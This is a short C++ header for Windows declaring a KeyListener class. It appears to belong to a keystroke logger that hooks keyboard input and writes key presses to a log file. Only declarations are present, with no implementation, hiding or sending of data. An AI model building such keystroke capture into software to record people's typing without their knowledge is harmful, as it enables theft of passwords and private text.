#ifndef KEY_LISTENER_INTERNALS_H
#define KEY_LISTENER_INTERNALS_H

#include <string>
#include <fstream>
#include <windows.h>

#include "key_listener_exports.h"
#include "logger.h"

class KeyListener {
    public:
        KeyListener(string &sKLogPath);
        ~KeyListener();
        void fnPressCallback (
		    int nCode,
		    WPARAM wParam,
		    LPARAM lParam
		);

    private:
        Logger m_KeyLogger;
        Logger m_DebugLogger;
        BYTE m_baKeysPressed[LOGGER_MAX_MULTI_KEYS];
};

static LRESULT CALLBACK fnKeyListenerPressCallbackProc (
    int nCode,
    WPARAM wParam,
    LPARAM lParam
);

#endif /* KEY_LISTENER_INTERNALS_H */